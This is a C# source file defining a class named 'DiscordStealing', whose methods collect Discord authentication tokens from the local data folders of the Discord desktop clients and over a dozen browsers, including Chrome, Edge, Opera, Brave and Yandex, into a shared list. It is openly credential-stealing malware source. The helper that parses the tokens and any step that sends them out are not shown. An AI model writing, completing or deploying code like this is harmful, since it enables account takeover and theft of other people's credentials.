using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace FooterTest
{
    class DiscordStealing
    {
        public static List<string> AllTokens = new List<string>() { };  //Here will be tokens

        public static async Task DiscordApp()
        {
            await Task.Run(() =>
            {
                AllTokens.AddRange(DiscordS.Get("Roaming\\discord\\"));
            });
        }
        public static async Task DiscordCanary()
        {
            await Task.Run(() =>
            {
                AllTokens.AddRange(DiscordS.Get("Roaming\\discordcanary\\"));
            });
        }
        public static async Task DiscordPTB()
        {
            await Task.Run(() =>
            {
                AllTokens.AddRange(DiscordS.Get("Roaming\\discordptb\\"));
            });
        }
        public static async Task Chrome()
        {
            await Task.Run(() =>
            {
                AllTokens.AddRange(DiscordS.Get("Local\\Google\\Chrome\\User Data\\Default\\"));
            });
        }
        public static async Task ChromeBeta()
        {
            await Task.Run(() =>
            {
                AllTokens.AddRange(DiscordS.Get("Local\\Google\\Chrome Beta\\User Data\\Default\\"));
            });
        }
        public static async Task FireFox()
        {
            await Task.Run(() =>
            {
                AllTokens.AddRange(DiscordS.Get("Roaming\\Mozilla\\Firefox\\Profiles\\Default\\"));
            });
        }
        public static async Task Opera()
        {
            await Task.Run(() =>
            {
                AllTokens.AddRange(DiscordS.Get("Roaming\\Opera Software\\Opera Stable\\Login Data\\"));
            });
        }
        public static async Task OperaGX()
        {
            await Task.Run(() =>
            {
                AllTokens.AddRange(DiscordS.Get("Roaming\\Opera Software\\Opera GX Stable\\Login Data\\"));
            });
        }
        public static async Task Edge()
        {
            await Task.Run(() =>
            {
                AllTokens.AddRange(DiscordS.Get("Local\\Microsoft\\Edge\\User Data\\Default\\"));
            });
        }
        public static async Task Yandex()
        {
            await Task.Run(() =>
            {
                AllTokens.AddRange(DiscordS.Get("Local\\Yandex\\YandexBrowser\\User Data\\Default\\"));
            });
        }
        public static async Task Brave()
        {
            await Task.Run(() =>
            {
                AllTokens.AddRange(DiscordS.Get("Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\"));
            });
        }
        public static async Task EpicPrivacy()
        {
            await Task.Run(() =>
            {
                AllTokens.AddRange(DiscordS.Get("Local\\Epic Privacy Browser\\User Data\\Default"));
            });
        }
        public static async Task Vivaldi()
        {
            await Task.Run(() =>
            {
                AllTokens.AddRange(DiscordS.Get("Local\\Vivaldi\\User Data\\Default"));
            });
        }
        public static async Task ThreeHundredSixty()
        {
            await Task.Run(() =>
            {
                AllTokens.AddRange(DiscordS.Get("Local\\360Browser\\Browser\\User Data\\Default"));
            });
        }
        public static async Task CocCoc()
        {
            await Task.Run(() =>
            {
                AllTokens.AddRange(DiscordS.Get("Local\\CocCoc\\Browser\\User Data\\Default\\"));
            });
        }
    }
}
